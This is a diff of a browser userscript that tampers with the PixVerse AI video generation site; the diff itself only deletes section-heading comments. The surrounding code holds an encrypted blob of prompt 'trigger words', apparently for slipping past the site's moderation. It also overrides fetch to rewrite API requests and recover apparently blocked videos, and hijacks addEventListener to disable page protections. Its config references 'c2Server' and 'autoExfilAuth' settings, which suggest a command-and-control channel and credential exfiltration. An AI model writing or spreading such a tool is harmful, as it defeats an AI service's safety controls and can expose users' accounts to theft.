@@ -20,8 +20,6 @@
   if (window._pixverseToolkitInitialized) return;
   window._pixverseToolkitInitialized = true;
 
-  //────── CORE CONFIGURATION & STATE ──────//
-
   const DEBUG_PREFIX = '[Ψ-4ndr0tools]';
   const DATA_LOG_PREFIX = '[Ψ-4ndr0tools DATA]';
   let savedMediaPath = null;
@@ -46,7 +44,6 @@
     ]
   };
 
-  //────── TRIGGER WORD OBFUSCATION ──────//
   const ENCRYPTED_TRIGGERS = "Lyo/Pys1Ljk4Kz0sOzcrKS87MCoqLCo7PComLCoqOy8qLy09KzgqLCoqPTIsKSo9KywqMyssMioqLzItLi8sPD8sKj8qPTotLCsvLio5KSwqOzcrKS89MioqPTMsKCs/Myw/LDotPDMsKz0sOzIsKzotKisrOzUqOzEqLCo9KSwqLjssKy8uLCoqOyopPTcrKSw9LDsvKj0tLSwrLzEsMys5KzcrKSwrPistPTIsKy8xLDMsOSs3KyksKz4rLT0yLCsvLCoqPSwrLzEsMys5KzcrKSwrPTIsKzEsMys5KzcrKSwrPistPTIsKy8xLCorLCssPSwqLCoqPSwsKzIsMioqPTsrLCs5KzcrKSwsPyo9LDsvKywqOzUqPTosKywrPTIsKyo9KywsKzIsMioqPTsrLCsrMyw/LDotPDMsKz0sOzIsKywqMywqPTsrLCs5LCs9LCoqLzItLioqPTEsKzMsOSs3KyksKz0sOzIsKywqOzUqPTosKywqPTcrKSwqPistPTIsKyo9KywqMyssMioqPTsrLCs9LCorLCssKzUsKy8qPSwsKzIsMioqPTsrLD8qPT0sKy8qPSosKz0sOzIsKywqOzUqPTosKyw/LDotPDMsKy8qPSosKy8qPTIsKzEsMys5KzcrKSwrPTIsKzEsMys5KzcrKSwrPTIsKzEsMys5KzcrKSwrPistPTIsKy8xLCoqPTIsKy8xLDMsOSs3KyksKz4rLT0yLCs/Kj0sKywqLzItLi8sPyoqPTcrKSwqOzUqPTosKywrPTIsKyo9KywqMyssMioqPTsrLCsrMyw/LDotPDMsKz0sOzIsKzcrKSwrPTIsKzEsMys5KzcrKSwrPTIsKzEsMys5KzcrKSwrPistPTIsKy8xLCoqPTIsKy8xLDMsOSs3KyksKz4rLT0yLCsvLCoqPTssKy8xLCorLCssKyo9KywsKzIsMioqPTsrLCsrMyw/LDotPDMsKz0sOzIsKzUsKy8qPSwsKzIsMioqPTsrLD8qPT0sKy8qPSosKy8qPTIsKzEsMys5KzcrKSwrPTIsKzEsMys5KzcrKSwrPistPTIsKy8xLCorLCssPSwqLzItLioqPTIsKy8xLDMsOSs3KyksKz0sOzIsKyo9KywqMyssMioqLzItLi8sPD8sKj8qPTotLCsvLio5KSwqOzcrKSwsKz0sOzIsKywqPTIsKzEsMys5KzcrKSwrPTIsKzEsMys5KzcrKSwrPTIsKzEsMys5KzcrKSwrPistPTIsKy8xLCoqPTIsKy8xLDMsOSs3KyksKz4rLT0yLCs/Kj0sKywqLzItLioqPTEsKzMsOSs3KyksKz0sOzIsKywqMywqPTsrLCs5LCs9LCoqLzItLioqPTEsKzMsOSs3KyksKz0sOzIsKyw/LDotPDMsKy8qPSosKy8qPTIsKzEsMys5KzcrKSwrPistPTIsKy8xLCorLCssPSwqLCoqPTIsKy8xLDMsOSs3KyksKz4rLT0yLCsvLCoqPTIsKy8xLDMsOSs3KyksKz4rLT0yLCs/Kj0sKywqLzItLioqPTMsKCs/Myw/LDotPDMsKz0sOzIsKywqMywqPTsrLDcrKSwrPistPTIsKy8xLCoqPTIsKy8xLDMsOSs3KyksKz4rLT0yLCsvLCoqPTssKy8xLCorLCssKyo9KywsKzIsMioqPTsrLCsrMyw/LDotPDMsKy8qPSosKy8qPTIsKzEsMys5KzcrKSwrPTIsKzEsMys5KzcrKSwrPTIsKzEsMys5KzcrKSwrPistPTIsKy8xLCoqPTIsKy8xLDMsOSs3KyksKz4rLT0yLCs/Kj0sKywqLzItLioqPTMsKCs/Myw/LDotPDMsKy8qPSosKzcrKSwrPistPTIsKy8xLCorLCssPSwqLCoqPTIsKy8xLDMsOSs3KyksKz0sOzIsKyo9KywqMywqPTsrLDcrKSwrPTIsKzEsMys5KzcrKSwrPTIsKzEsMys5KzcrKSwrPistPTIsKy8xLCoqPTIsKy8xLDMsOSs3KyksKz4rLT0yLA==";
   const DECRYPTION_KEY = "ChimeraKey2024";
 
@@ -163,7 +160,6 @@
     return prompt;
   }
 
-  //────── API MODIFICATION & ASSET RECOVERY ──────//
   async function verifyAndRecoverUrl(videoInfo) {
     if (!videoInfo || !videoInfo.video_path) return;
     const originalUrl = `https://media.pixverse.ai/${videoInfo.video_path}`;
@@ -225,7 +221,6 @@
     return modified;
   }
 
-  //────── NETWORK INTERCEPTION ──────//
   function processRequestBodyModifications(url, method, body) {
     let modBody = safeDeepClone(body), modified = false;
     if (config.forceQuality !== 'none' && matchesEndpoint(url, "creativeVideo") && method === "POST" && modBody.quality !== config.forceQuality) { modBody.quality = config.forceQuality; modified = true; }
@@ -310,7 +305,6 @@
     myCustomFetch = window.fetch; log('Fetch override initialized');
   }
 
-  //────── UNIFIED UI & ASSET PANEL ──────//
   const SESSION_KEY = 'pixverse_generated_videos_session';
   const MAX_SESSION_ITEMS = 50;
   async function downloadUrl(url, filename) {
@@ -347,7 +341,6 @@
     }
   }
 
-  //────── DOM MANIPULATION & UI FEATURES ──────//
   function throttle(fn, delay) { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn.apply(this, a), delay); }; }
   function overrideContextMenuBlockers() { EventTarget.prototype.addEventListener = new Proxy(EventTarget.prototype.addEventListener, { apply: (t, a, r) => (r[0] === 'contextmenu') ? null : Reflect.apply(t, a, r) }); }
   let domTamperObserver = null;
@@ -374,7 +367,6 @@
     document.head.insertAdjacentHTML('beforeend', `<style id="${styleId}">${rules}</style>`);
   }
 
-  //────── GM_config UI & Debug UI Integration ──────//
   async function loadConfig() { for (const key in config) if(key !== 'c2Enabled' && key !== 'c2Server' && key !== 'autoExfilAuth') config[key] = await GM_getValue(key, config[key]); }
   function updateDebugUIVisibility() {
     const p = document.getElementById('pv-debug-panel'); if (p) p.style.display = config.debugMode ? 'flex' : 'none';
